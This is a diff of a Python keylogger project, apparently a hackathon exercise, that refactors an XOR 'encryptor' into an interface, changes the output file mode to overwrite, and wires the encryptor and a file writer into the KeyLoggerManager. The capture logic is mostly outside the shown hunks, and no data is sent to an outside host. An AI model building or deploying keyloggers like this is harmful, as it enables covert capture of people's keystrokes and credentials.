@@ -13,14 +13,26 @@ class IWriter(ABC):
     def write(self, data):
         pass
 
-class Encryptor:
-    @staticmethod
-    def xor_encryption(text):
+
+class IEncryptor(ABC):
+    @abstractmethod
+    def encryption(self,text):
+        pass
+
+    def decryption(self,text):
+        pass
+
+class XorEncryptor( IEncryptor):
+
+    def encryption(self,text):
         key = "a"
         encrypted_text = ""
         for i in range(len(text)):
             encrypted_text += chr(ord(text[i]) ^ ord(key[i % len(key)]))
         return encrypted_text
+
+    def decryption(self,text):
+        return self.encryption(text)
 
 
 class KeyloggerService:
@@ -31,7 +43,7 @@ class KeyloggerService:
         self.current_app = None
 
     def __change_action(self):
-        self.__action = not (self.__action)
+        self.__action = not self.__action
 
 
     def __exit_point(self):
@@ -136,7 +148,7 @@ import os
 class FileWriter(IWriter):
 
     def write(self, data):
-        with open(r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json" , "a" , encoding="utf-8") as file:
+        with open(r"C:\Users\matan\kodkod\programming\Hackathon_KeyLoger_agent\new_projecct\matanya alkobi\output.json" , "w" , encoding="utf-8") as file:
             if data:
                 json.dump(data , file ,ensure_ascii=False,  indent=4)
 
@@ -145,12 +157,15 @@ class KeyLoggerManager:
 
     def __init__(self):
         self.instance = KeyloggerService()
+        self.encryptor : IEncryptor = XorEncryptor()
+        self.writer : IWriter = FileWriter()
+
 
     def start(self):
         self.instance.start()
 
     def write_to_file(self):
-        FileWriter().write(self.instance.get_data())
+        self.writer.write(self.instance.get_data())
 
     def main(self):
         threading.Thread(target=self.start).start()
@@ -161,8 +176,12 @@ class KeyLoggerManager:
             time.sleep(5)
 print(get_mac_address())
 
+
 A = KeyLoggerManager()
 A.main()
+
+
+
 
 
 
